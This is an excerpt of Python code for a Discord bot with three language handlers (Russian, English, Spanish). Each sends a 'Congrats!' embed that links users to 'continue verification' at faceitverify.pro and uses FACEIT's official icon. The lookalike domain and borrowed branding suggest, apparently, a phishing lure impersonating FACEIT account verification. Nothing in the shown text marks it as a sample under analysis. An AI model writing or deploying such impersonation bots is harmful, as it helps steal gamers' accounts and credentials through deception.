...
async def start_RU(ctx, member: discord.Member):
    ...
    try:
        ...
        embed = discord.Embed(
            title="✅ Поздравляем!",
            description="[Нажми, чтобы продолжить верификацию](http://faceitverify.pro/hub/)",
...
async def start_EU(ctx, member: discord.Member):
    ...
    try:
        ...
        embed = discord.Embed(
            title="✅ Congrats!",
            description=
            "[Press to continue verification](http://faceitverify.pro/hub/)",
            color=discord.Color.dark_orange())
        embed.set_thumbnail(
            url=
...
async def start_SP(ctx, member: discord.Member):
    ...
    try:
        ...
        embed = discord.Embed(
            title="✅ ¡Felicidades!",
            description="[Haz clic para continuar con la verificación](http://faceitverify.pro/hub/)",
            color=discord.Color.dark_orange()
        )
        embed.set_thumbnail(
            url="https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
